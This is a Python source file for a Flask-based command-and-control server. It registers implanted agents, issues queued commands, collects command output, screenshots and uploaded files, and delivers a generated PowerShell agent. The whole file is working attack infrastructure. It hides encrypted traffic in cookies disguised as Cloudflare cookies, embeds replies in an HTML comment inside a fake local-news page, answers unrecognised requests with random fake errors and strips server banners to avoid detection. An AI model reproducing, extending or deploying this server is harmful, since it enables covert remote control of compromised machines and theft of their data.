"""
C2 Server
"""
import logging
import ssl
import os
from flask import Flask, request, send_from_directory, jsonify
import json
import base64
from urllib.parse import urlparse, parse_qs
from database.operations import AgentDatabase
from crypto.aes_cipher import aes_encrypt_decrypt
from utils.file_upload import FileUploadManager
from utils.agent_generator import AgentGenerator

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class C2Server:
    def __init__(self, listener_config, config_loader, logger):
        """
        listener_config: dict with keys:
          id, name, bind_host, bind_port, protocol, profile_id, profile, created_at
        The profile sub-dict contains: description, upstream, http
        """
        self.listener_config = listener_config
        self.profile = listener_config['profile']
        self.config_loader = config_loader
        self.logger = logger
        self.app = Flask(
            f"c2_{listener_config['id']}",
            template_folder="../templates",
        )
        self.db = AgentDatabase()
        self.upload_manager = FileUploadManager(upload_dir="uploads", logger=logger)
        self.agent_generator = AgentGenerator(config_loader, logger)
        self.configured_uris = self._parse_configured_uris()
        self.ssl_context = self._create_ssl_context()
        self._setup_routes()
        self._setup_error_handlers()
        self._setup_middleware()

        self._server = None
        self.html_template = """<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Local Gazette — Business & Culture</title><meta name="description" content="Local news, analysis and culture. Daily updates."><link rel="stylesheet" href="/assets/css/main.css"><meta name="author" content="Local Gazette Editorial Team"><link rel="icon" href="/assets/img/favicon.ico"><style>:root{--max-w:1100px;--muted:#6b7280;--card-bg:#fff}body,html{height:100%}body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;line-height:1.65;margin:0;padding:0;background:#f3f4f6;color:#111827}a{color:inherit;text-decoration:none}header{background:linear-gradient(90deg,#fff 0,#fcfcfd 100%);border-bottom:1px solid rgba(0,0,0,.04)}.container{max-width:var(--max-w);margin:20px auto;padding:0 18px}.topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 0}nav.primary a{margin:0 10px;color:var(--muted);font-weight:600;font-size:.95rem}.brand{display:flex;align-items:center;gap:12px}.logo{width:44px;height:44px;border-radius:6px;background:#111827;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700}main.grid{display:grid;grid-template-columns:2fr 1fr;gap:20px}.card{background:var(--card-bg);padding:18px;margin-bottom:18px;border-radius:10px;box-shadow:0 6px 18px rgba(16,24,40,.03)}.lead-article{display:grid;grid-template-columns:1fr 330px;gap:18px}.lead-media{height:240px;background-image:url(/assets/img/lead.jpg);background-size:cover;border-radius:8px}.meta{color:var(--muted);font-size:.9rem}.byline{display:flex;align-items:center;gap:10px}.author-pic{width:36px;height:36px;border-radius:999px;background:#e5e7eb}.article-body p{margin:12px 0}.sidebar .widget{margin-bottom:12px}footer{margin-top:30px;padding:18px 0;background:0 0;color:var(--muted)}.tag-cloud a{display:inline-block;margin:6px 8px;padding:6px 10px;background:#f8fafc;border-radius:999px;font-size:.85rem}.small{font-size:.9rem;color:var(--muted)}.comments{margin-top:18px}input,textarea{width:100%;padding:10px;border:1px solid #e6e7eb;border-radius:6px}.btn{display:inline-block;padding:10px 14px;border-radius:8px;background:#111827;color:#fff;font-weight:600}@media (max-width:900px){main.grid{grid-template-columns:1fr}.lead-article{grid-template-columns:1fr}}</style><script type="application/ld+json">{
    "@context": "https://schema.org",
    "@type": "NewsArticle",
    "headline": "Markets show minor fluctuations after announcement",
    "datePublished": "2025-09-12T08:30:00-03:00",
    "author": {"@type":"Person","name":"A. Reporter"},
    "publisher": {"@type":"Organization","name":"Local Gazette","logo":{"@type":"ImageObject","url":"/assets/img/logo.png"}}
  }</script></head><body><header><div class="container topbar"><div class="brand"><div class="logo">LG</div><div><div style="font-weight:700">Local Gazette</div><div class="small">Trusted local journalism since 1998</div></div></div><nav class="primary" aria-label="main menu"><a href="/">Home</a><a href="/business">Business</a><a href="/culture">Culture</a><a href="/opinion">Opinion</a><a href="/lifestyle">Lifestyle</a><a href="/subscribe">Subscribe</a></nav></div></header><main class="container"><div class="grid"><section><div class="card lead-article"><div><div class="lead-media" role="img" aria-label="Market floor"></div><h1 style="margin-top:14px">Markets show minor fluctuations after announcement</h1><div class="meta byline"><div class="author-pic" aria-hidden="true"></div><div><div style="font-weight:600">A. Reporter</div><div class="small">September 12, 2025 · Business · 3 min read</div></div></div><div class="article-body" style="margin-top:12px"><p>Markets responded with modest volatility following the central bank's statement on monetary outlook. Investors re-priced short-term instruments while longer-dated assets remained relatively stable.</p><p>Analysts pointed to a combination of cautious sentiment and mixed economic data. "The immediate reaction was expected," said one market strategist. "Underlying fundamentals haven't shifted dramatically; we saw rotation rather than panic."</p><p>Local businesses reported steady foot traffic despite broader concerns, with small retailers citing improved consumer confidence in recent weeks.</p><h3>What this means for the region</h3><p>For households, inflation expectations are a moderating factor. Mortgage rates may follow global trends, but local lending markets remain competitive.</p><p>For industry, some export-oriented businesses may face short-term currency headwinds, while service sectors could benefit from renewed domestic demand.</p></div></div><aside style="padding-left:10px"><div style="position:sticky;top:20px"><div class="card" style="padding:12px"><h4 style="margin:0 0 8px 0">Market snapshot</h4><div class="small">S&P-like index: +0.4%</div><div class="small">Local currency: -0.2% vs USD</div><div style="margin-top:8px"><a class="btn" href="/markets">Full markets</a></div></div><div class="card widget"><h5 style="margin:0 0 8px 0">Newsletter</h5><p class="small">Get a daily digest of top stories by email.</p><form action="/subscribe" method="post"><input type="email" name="email" placeholder="you@example.com" required><div style="margin-top:8px"><button class="btn" type="submit">Subscribe</button></div></form></div><div class="card widget"><h5 style="margin:0 0 8px 0">Sponsored</h5><a href="https://example.com" target="_blank" rel="noopener"><div style="height:90px;background:#eef2ff;border-radius:8px;display:flex;align-items:center;justify-content:center">Ad placeholder — Sustainable Delivery Co.</div></a></div></div></aside></div><div class="card"><h3>Related coverage</h3><ul><li><a href="/story/1123">Regional startup ec<!--1RVGE1 {base64_data} 1RVGE1-->osystem sees renewed funding</a></li><li><a href="/story/1124">Retail sales show surprising resilience</a></li><li><a href="/story/1125">Opinion: How policy shapes local growth</a></li></ul></div><div class="card"><h3>Featured stories</h3><article style="display:flex;gap:12px;align-items:flex-start;margin-bottom:12px"><div style="width:110px;height:70px;background:#f3f4f6;border-radius:6px"></div><div><a href="/story/1201" style="font-weight:600">Community arts fair draws local crowds and artists</a><div class="small">By B. Cultural — Sep 10</div><p class="small">Highlights from the weekend event and interviews with participating artists.</p></div></article><article style="display:flex;gap:12px;align-items:flex-start;margin-bottom:12px"><div style="width:110px;height:70px;background:#f3f4f6;border-radius:6px"></div><div><a href="/story/1202" style="font-weight:600">Local startup launches sustainable delivery platform</a><div class="small">By C. Tech — Sep 11</div><p class="small">Interview with founders and a look at logistics challenges.</p></div></article></div><div class="card"><h3>From the archive</h3><p class="small">Looking back: How the 2008 local policy changes shaped today's market — an in-depth retrospective.</p><a href="/archive/2008">Read more »</a></div><div class="card comments" id="comments"><h3>Reader comments</h3><div class="small" style="margin-bottom:10px">(comments are moderated; recent)</div><div style="margin-bottom:12px"><strong>Jamie</strong><span class="small">— Sep 12</span><p class="small">Useful summary, thanks — would like to see more on small business lending.</p></div><form action="/comments" method="post"><input type="text" name="name" placeholder="Your name" required><textarea name="comment" rows="3" placeholder="Add a comment" required style="margin-top:8px"></textarea><div style="margin-top:8px"><button class="btn" type="submit">Post comment</button></div></form></div></section><aside class="sidebar"><div class="card widget"><h4>Top stories</h4><ol><li><a href="/story/1301">Mayor announces new transport plan</a></li><li><a href="/story/1302">High school robotics team wins national title</a></li><li><a href="/story/1303">Local hospital expands outpatient services</a></li></ol></div><div class="card widget"><h4>Events</h4><ul><li>Sep 14 — Innovation meetup</li><li>Sep 18 — Farmers market</li><li>Sep 20 — Open mic night</li></ul></div><div class="card widget"><h4>Tags</h4><div class="tag-cloud"><a href="/tags/economy">Economy</a><a href="/tags/culture">Culture</a><a href="/tags/tech">Tech</a><a href="/tags/local">Local</a><a href="/tags/opinion">Opinion</a></div></div><div class="card widget"><h4>Weather</h4><div class="small">Mostly sunny · 24°C</div><div class="small">High: 26° · Low: 18°</div></div><div class="card widget"><h4>Contact</h4><div class="small">news@localgazette.example</div><div class="small">(555) 123-4567</div></div></aside></div></main><footer class="container"><div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px"><div class="small">© 2025 Local Gazette — All rights reserved.</div><div class="small">123 Main Street, Suite 400 · City</div><nav class="small"><a href="/privacy">Privacy</a>·<a href="/terms">Terms</a>·<a href="/contact">Contact</a></nav></div></footer><script>!function(){try{var e=localStorage.getItem("lg_visits")||0;e=parseInt(e,10)+1,localStorage.setItem("lg_visits",e),navigator.sendBeacon&&navigator.sendBeacon("/beacon",JSON.stringify({visits:e}))}catch(e){}}(),document.addEventListener("keyup",function(e){"?"!==e.key&&"/"!==e.key||document.querySelector('input[name="email"]').focus()})</script></body></html>"""

    # ------------------------------------------------------------------
    # Helpers to read from listener_config / profile
    # ------------------------------------------------------------------

    def _get_http_config(self):
        return self.profile.get('http', {})

    def _get_agent_uris(self):
        return self._get_http_config().get('uris', [])

    def _get_agent_user_agent(self):
        return self._get_http_config().get('user_agent', '')

    def _get_agent_upstream_hosts(self):
        upstream = self.profile.get('upstream', {})
        return upstream.get('hosts', [])

    def _get_agent_request_headers(self):
        return self._get_http_config().get('request_headers', [])

    def _get_agent_response_headers(self):
        return self._get_http_config().get('response_headers', [])

    # ------------------------------------------------------------------
    # SSL context
    # ------------------------------------------------------------------

    def _create_ssl_context(self):
        ssl_config = self.config_loader.get_global_ssl_config()

        if not ssl_config.get('enabled', False):
            return None

        cert_file = ssl_config.get('cert_file')
        key_file = ssl_config.get('key_file')

        if not cert_file or not key_file:
            return None

        if not os.path.exists(cert_file) or not os.path.exists(key_file):
            return None

        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_version = ssl_config.get('ssl_version', 'TLSv1_2')
            if ssl_version == 'TLSv1_3':
                context.minimum_version = ssl.TLSVersion.TLSv1_3
            elif ssl_version == 'TLSv1_2':
                context.minimum_version = ssl.TLSVersion.TLSv1_2

            ciphers = ssl_config.get('ciphers', 'HIGH:!aNULL:!MD5')
            context.set_ciphers(ciphers)
            context.load_cert_chain(cert_file, key_file)
            context.verify_mode = ssl.CERT_NONE

            return context

        except Exception:
            return None

    # ------------------------------------------------------------------
    # URI parsing
    # ------------------------------------------------------------------

    def _parse_configured_uris(self):
        agent_uris = self._get_agent_uris()
        parsed_uris = []
        for uri in agent_uris:
            parsed = urlparse(uri)
            parsed_uris.append({
                'original': uri,
                'path': parsed.path,
                'query': parsed.query,
                'query_params': parse_qs(parsed.query) if parsed.query else {}
            })
        return parsed_uris

    # ------------------------------------------------------------------
    # Middleware
    # ------------------------------------------------------------------

    def _setup_middleware(self):
        @self.app.before_request
        def validate_request():
            if self._is_agent_delivery_route():
                return self._validate_agent_delivery_headers()
            elif self._is_agent_route():
                return self._validate_agent_headers()
            return None

        @self.app.after_request
        def apply_response_headers(response):
            if self._is_agent_delivery_route():
                return self._apply_agent_delivery_headers(response)
            elif self._is_agent_route():
                return self._apply_agent_headers(response)
            return response

    def _is_agent_delivery_route(self):
        if len(self.configured_uris) >= 2:
            delivery_uri = self.configured_uris[1]
            return self._matches_configured_uri(delivery_uri)
        return False

    def _is_agent_route(self):
        if len(self.configured_uris) >= 1:
            agent_uri = self.configured_uris[0]
            return self._matches_configured_uri(agent_uri)
        return False

    def _matches_configured_uri(self, configured_uri):
        if request.path != configured_uri['path']:
            return False

        if not configured_uri['query_params']:
            return True

        request_args = request.args.to_dict()

        for param, expected_values in configured_uri['query_params'].items():
            if param not in request_args:
                return False

            expected_value = expected_values[0] if isinstance(expected_values, list) else expected_values
            if request_args[param] != expected_value:
                return False

        return True

    def _validate_agent_delivery_headers(self):
        return self._validate_agent_headers()

    def _validate_agent_headers(self):
        expected_user_agent = self._get_agent_user_agent()
        expected_hosts = self._get_agent_upstream_hosts()
        if expected_user_agent:
            received_user_agent = request.headers.get('User-Agent', '')
            if received_user_agent != expected_user_agent:
                self.logger.log_event(f"SECURITY - Invalid User-Agent rejected for URI: {request.path}")
                return self._generate_fake_response()
        if expected_hosts:
            received_host = request.headers.get('Host', '')
            if received_host not in expected_hosts and not any(host in received_host for host in expected_hosts):
                self.logger.log_event(f"SECURITY - Invalid Host rejected for URI: {request.path}")
                return self._generate_fake_response()
        if not self._validate_request_headers():
            self.logger.log_event(f"SECURITY - Invalid request headers for URI: {request.path}")
            return self._generate_fake_response()
        return None

    def _validate_request_headers(self):
        expected_headers = self._get_agent_request_headers()
        if not expected_headers:
            return True
        for header_line in expected_headers:
            if ':' in header_line:
                key, expected_value = header_line.split(':', 1)
                key = key.strip()
                expected_value = expected_value.strip()
                received_value = request.headers.get(key, '')
                if received_value != expected_value:
                    self.logger.log_event(f"SECURITY - Invalid header rejected: expected='{expected_value}'")
                    return False
        return True

    def _generate_fake_response(self):
        fake_responses = [
            ("Not Found", 404),
            ("Forbidden", 403),
            ("Internal Server Error", 500),
            ("Service Unavailable", 503)
        ]
        import random
        content, status = random.choice(fake_responses)
        response = self.app.response_class(content, status=status)
        return self._apply_agent_headers(response)

    def _apply_agent_delivery_headers(self, response):
        return self._apply_agent_headers(response)

    def _apply_agent_headers(self, response):
        agent_headers = self._get_agent_response_headers()
        for header_line in agent_headers:
            if ':' in header_line:
                key, value = header_line.split(':', 1)
                key = key.strip()
                value = value.strip()
                response.headers[key] = value
        return response

    # ------------------------------------------------------------------
    # Routes
    # ------------------------------------------------------------------

    def _setup_routes(self):
        paths_dict = {}
        for i, uri_config in enumerate(self.configured_uris):
            uri_path = uri_config['path']
            if uri_path not in paths_dict:
                paths_dict[uri_path] = []
            paths_dict[uri_path].append({
                'index': i,
                'config': uri_config
            })

        for path, uri_list in paths_dict.items():
            if len(uri_list) == 1:
                uri_info = uri_list[0]
                index = uri_info['index']

                if index == 0:
                    self.app.add_url_rule(
                        path,
                        f'agent_main_endpoint_{index}',
                        self._handle_agent_endpoint,
                        methods=["GET", "POST"]
                    )
                    self.app.add_url_rule(
                        f"{path}/upload",
                        f'command_output_upload_{index}',
                        self._handle_command_output_upload,
                        methods=["POST"]
                    )
                elif index == 1:
                    self.app.add_url_rule(
                        path,
                        f'agent_delivery_endpoint_{index}',
                        self._handle_agent_delivery,
                        methods=["GET"]
                    )
            else:
                def create_multi_uri_handler(uri_list_copy):
                    def multi_uri_handler():
                        for uri_info in uri_list_copy:
                            uri_config = uri_info['config']
                            index = uri_info['index']

                            if self._matches_configured_uri(uri_config):
                                if index == 0:
                                    return self._handle_agent_endpoint()
                                elif index == 1:
                                    return self._handle_agent_delivery()

                        self.logger.log_event(f"SECURITY - No matching URI for path: {path} with params: {dict(request.args)}")
                        return "Not Found", 404

                    return multi_uri_handler

                handler = create_multi_uri_handler(uri_list)
                self.app.add_url_rule(
                    path,
                    f'multi_uri_endpoint_{path.replace("/", "_")}',
                    handler,
                    methods=["GET", "POST"]
                )

        @self.app.route("/<path:path>")
        def serve_static(path):
            return self._handle_unauthorized_request(path)

    # ------------------------------------------------------------------
    # Request handlers
    # ------------------------------------------------------------------

    def _handle_agent_delivery(self):
        try:
            agent_content = self.agent_generator.generate_agent(self.listener_config)
            if not agent_content:
                self.logger.log_event(f"AGENT DELIVERY - Generation failed")
                return "Internal Server Error", 500
            self.logger.log_event(f"AGENT DELIVERY - PowerShell agent delivered.")
            response = self.app.response_class(agent_content, status=200, mimetype='text/plain')
            return self._apply_agent_delivery_headers(response)
        except Exception as e:
            self.logger.log_event(f"AGENT DELIVERY - Error: {str(e)}")
            response = self.app.response_class("Error", status=500)
            return self._apply_agent_headers(response)

    def _handle_agent_endpoint(self):
        if request.method == "POST":
            return self._handle_file_upload()
        else:
            return self._handle_agent_communication()

    def _handle_unauthorized_request(self, path):
        self.logger.log_event(f"SECURITY - Access denied to unauthorized route: /{path}")
        return "Not Found", 404

    def _setup_error_handlers(self):
        @self.app.errorhandler(404)
        def not_found(error):
            self.logger.log_event(f"404 - Page not found on C2: {request.url}")
            return "Not Found", 404

        @self.app.errorhandler(500)
        def internal_error(error):
            self.logger.log_event(f"500 - Internal C2 server error: {error}")
            return "Internal Server Error", 500

    def _handle_agent_communication(self):
        cookies = request.cookies
        if 'cfin' in cookies:
            self._process_agent_fingerprint(cookies['cfin'])
        if 'cfsync' in cookies:
            self._process_agent_sync(cookies['cfsync'])
        if 'cflb' in cookies and 'cf_clearance' in cookies:
            self._process_command_output(cookies['cf_clearance'], cookies['cflb'])
        return self._generate_json_response(cookies)

    def _handle_file_upload(self):
        try:
            if not request.data:
                return self._generate_upload_error_response("No data received")
            encrypted_data = request.data.decode('utf-8')
            result = self.upload_manager.process_upload_request(encrypted_data)
            if result["success"]:
                return self._generate_upload_success_response(result)
            else:
                return self._generate_upload_error_response(result.get('error', 'Unknown error'))
        except Exception as e:
            self.logger.log_event(f"UPLOAD - Critical error: {e}")
            return self._generate_upload_error_response(f"Internal error: {str(e)}")

    def _generate_upload_success_response(self, result):
        response_data = {
            "status": "success",
            "filename": result['saved_filename'],
            "size": result['file_size']
        }
        json_str = json.dumps(response_data)
        encrypted_response = self._encrypt_json_response(json_str)
        html_response = self.html_template.replace("{base64_data}", encrypted_response)
        response = self.app.response_class(html_response, status=200, mimetype='text/html')
        return self._apply_agent_headers(response)

    def _generate_upload_error_response(self, error_message):
        response_data = {
            "status": "error",
            "error": error_message
        }
        json_str = json.dumps(response_data)
        encrypted_response = self._encrypt_json_response(json_str)
        html_response = self.html_template.replace("{base64_data}", encrypted_response)
        response = self.app.response_class(html_response, status=400, mimetype='text/html')
        return self._apply_agent_headers(response)

    def _process_agent_fingerprint(self, cfin_cookie):
        try:
            decrypted_data = aes_encrypt_decrypt(cfin_cookie, "decrypt")
            agent_data = json.loads(decrypted_data)
            self.db.register_agent(agent_data)
            self.logger.log_event(f"AGENT REGISTERED: {agent_data['uuid']} ({agent_data.get('hostname', 'N/A')})")
        except Exception as e:
            self.logger.log_event(f"Error registering agent: {e}")

    def _process_agent_sync(self, cfsync_cookie):
        try:
            decrypted_sync = aes_encrypt_decrypt(cfsync_cookie, "decrypt")
            sync_data = json.loads(decrypted_sync)
            self.db.update_last_seen(sync_data['uuid'], sync_data['timestamp'])
        except Exception as e:
            self.logger.log_event(f"Error updating last_seen: {e}")

    def _process_command_output(self, cf_clearance_cookie, cflb_cookie):
        try:
            decrypted_clearance = aes_encrypt_decrypt(cf_clearance_cookie, "decrypt")
            clearance_data = json.loads(decrypted_clearance)
            uuid = clearance_data['uuid']
            tid = clearance_data.get('tid')
            decrypted_output = aes_encrypt_decrypt(cflb_cookie, "decrypt")

            if "[SCREENSHOT]" in decrypted_output:
                self.logger.log_event(f"SCREENSHOT - Received from {uuid[:8]}")
                decrypted_output = decrypted_output.replace("[SCREENSHOT]", "")
            else:
                self.logger.log_event(f"OUTPUT - Received from {uuid[:8]} via cookie")

            self.db.set_command_output(uuid, decrypted_output)

            if tid:
                self.db.complete_task(tid, decrypted_output)
            else:
                self.db.complete_task_by_uuid(uuid, decrypted_output)
        except Exception as e:
            self.logger.log_event(f"Error saving output from cookie: {e}")

    def _handle_command_output_upload(self):
        try:
            if not request.data:
                return self._generate_upload_error_response("No command output data received")

            encrypted_data = request.data.decode('utf-8')
            decrypted_data = aes_encrypt_decrypt(encrypted_data, "decrypt")
            output_data = json.loads(decrypted_data)

            if output_data.get('type') != 'command_output':
                return self._generate_upload_error_response("Invalid data type")

            uuid = output_data.get('uuid')
            command_output = output_data.get('data')
            tid = output_data.get('tid')

            if not uuid or not command_output:
                return self._generate_upload_error_response("Missing required fields")

            if "[SCREENSHOT]" in command_output:
                self.logger.log_event(f"SCREENSHOT - Received from {uuid[:8]}")
                command_output = command_output.replace("[SCREENSHOT]", "")
            else:
                self.logger.log_event(f"OUTPUT - Received from {uuid[:8]} via POST")

            self.db.set_command_output(uuid, command_output)

            if tid:
                self.db.complete_task(tid, command_output)
            else:
                self.db.complete_task_by_uuid(uuid, command_output)

            response_data = {
                "status": "success",
                "message": "Command output received successfully"
            }
            json_str = json.dumps(response_data)
            encrypted_response = self._encrypt_json_response(json_str)
            html_response = self.html_template.replace("{base64_data}", encrypted_response)
            response = self.app.response_class(html_response, status=200, mimetype='text/html')
            return self._apply_agent_headers(response)

        except Exception as e:
            self.logger.log_event(f"Error processing command output via POST: {e}")
            return self._generate_upload_error_response(f"Error processing command output: {str(e)}")

    def _generate_json_response(self, cookies):
        try:
            if 'cf_clearance' in cookies:
                decrypted_clearance = aes_encrypt_decrypt(cookies['cf_clearance'], "decrypt")
                uuid = json.loads(decrypted_clearance)['uuid']

                task = self.db.get_next_task(uuid)
                if task:
                    self.db.dispatch_task(task['id'])
                    response_data = {
                        "uuid": uuid,
                        "cmd": task['command'],
                        "tid": task['id']
                    }
                else:
                    response_data = {"uuid": uuid, "cmd": "", "tid": 0}

                json_str = json.dumps(response_data)
                encrypted_response = self._encrypt_json_response(json_str)
                html_response = self.html_template.replace("{base64_data}", encrypted_response)
                response = self.app.response_class(html_response, status=200, mimetype='text/html')
                return self._apply_agent_headers(response)
        except Exception as e:
            self.logger.log_event(f"Error generating JSON response: {e}")

        empty_response = self._encrypt_json_response('{"uuid":"","cmd":"","tid":0}')
        html_response = self.html_template.replace("{base64_data}", empty_response)
        response = self.app.response_class(html_response, status=200, mimetype='text/html')
        return self._apply_agent_headers(response)

    def _encrypt_json_response(self, json_str):
        try:
            encrypted_result = aes_encrypt_decrypt(json_str, "encrypt")
            return encrypted_result
        except Exception:
            return base64.b64encode('{"error":"encryption_failed"}'.encode()).decode()

    # ------------------------------------------------------------------
    # Run
    # ------------------------------------------------------------------

    def run(self):
        host = self.listener_config['bind_host']
        port = self.listener_config['bind_port']

        from werkzeug.serving import WSGIRequestHandler, make_server
        WSGIRequestHandler.server_version = ""
        WSGIRequestHandler.sys_version = ""

        try:
            if self.ssl_context:
                self._server = make_server(host, port, self.app, ssl_context=self.ssl_context)
            else:
                self._server = make_server(host, port, self.app)
            self._server.serve_forever()
        except Exception as e:
            self.logger.log_event(f"C2 SERVER - Error on listener '{self.listener_config['id']}': {e}")
        finally:
            self._server = None

    def stop(self):
        if self._server:
            self._server.shutdown()
